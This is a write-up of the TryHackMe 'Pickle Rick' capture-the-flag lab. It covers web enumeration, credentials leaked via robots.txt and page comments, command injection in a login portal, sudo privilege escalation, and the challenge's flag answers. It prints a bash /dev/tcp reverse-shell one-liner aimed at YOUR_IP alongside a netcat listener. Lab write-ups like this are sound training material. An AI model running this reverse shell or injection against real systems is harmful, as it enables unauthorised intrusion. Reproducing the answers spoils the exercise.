# 🧪 Pickle Rick - TryHackMe Writeup

## 📌 Overview

This challenge is a Rick and Morty-themed CTF that involves exploiting a vulnerable web application to retrieve three secret ingredients needed to complete Rick's potion.

---

## 🎯 Target

```
http://10.128.184.164
```

---

## 🔍 Enumeration

### 1. Checking HTTP Headers

```bash
curl -I http://10.128.184.164
```

---

### 2. robots.txt

```bash
curl http://10.128.184.164/robots.txt
```

Output:

```
Wubbalubbadubdub
```

➡️ Used as password later.

---

### 3. View Page Source

```bash
curl http://10.128.184.164
```

Found in comments:

```
Username: R1ckRul3s
```

---

### 4. Directory Enumeration

```bash
gobuster dir -u http://10.128.184.164 -w /usr/share/wordlists/dirb/common.txt -x php
```

Found:

* /login.php
* /portal.php

---

## 🔐 Authentication

Credentials:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Login via `/login.php`

---

## 💻 Command Injection

After login, the portal allows command execution.

---

## 🧪 Ingredient 1

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Output:

```
mr. meeseek hair
```

---

## 🧪 Ingredient 2

```bash
ls /home/rick
```

Found:

```
second ingredients
```

Read file:

```bash
less /home/rick/second\ ingredients
```

---

## 🚨 Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: ALL
```

➡️ Full root access without password.

---

## 🐚 Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Execute from portal:

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

---

## 👑 Root Access

Upgrade shell:

```bash
sudo bash
```

---

## 🧪 Ingredient 3

```bash
cat /root/3rd.txt
```

Output:

```
3rd ingredients: fleeb juice
```

---

## ✅ Final Answers

| Ingredient | Value                          |
| ---------- | ------------------------------ |
| 1st        | mr. meeseek hair               |
| 2nd        | (from second ingredients file) |
| 3rd        | fleeb juice                    |

---

## 🏁 Conclusion

This challenge demonstrates:

* Web enumeration techniques
* Credential discovery via source code and robots.txt
* Command Injection exploitation
* Privilege escalation using sudo misconfiguration
* Reverse shell techniques

---

## 🔥 Author

OmarHasanen 
